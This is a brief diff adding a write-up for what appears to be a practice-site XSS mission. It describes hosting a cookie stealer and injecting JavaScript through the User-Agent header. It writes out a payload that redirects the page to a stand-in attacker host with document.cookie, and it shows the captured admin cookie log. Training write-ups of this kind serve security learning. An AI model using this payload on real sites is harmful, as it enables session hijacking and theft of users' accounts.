@@ -1,0 +1,11 @@
+set up the cookie stealer from the realistic 1 easter egg on a server
+
+then through your user agent inject the JS code that egg gives you
+you have to modify it though to be document.location='http://www.yoursite.com/stealer.php?c='+document.cookie
+
+it will send the cookie to your server
+
+Cookie: <b>admin=178d89</b><br /> IP: <b>198.27.115.229</b><br /> 
+    Date and Time: <b>Wed Apr 9 2014 17:05:23 MDT </b><br /> Referer: <b>http://www.enigmagroup.org/missions/basics/xss/2/logs.php</b><br /><br />beck@isrl:/var/www/html/yhack2
+
+and there's the password!
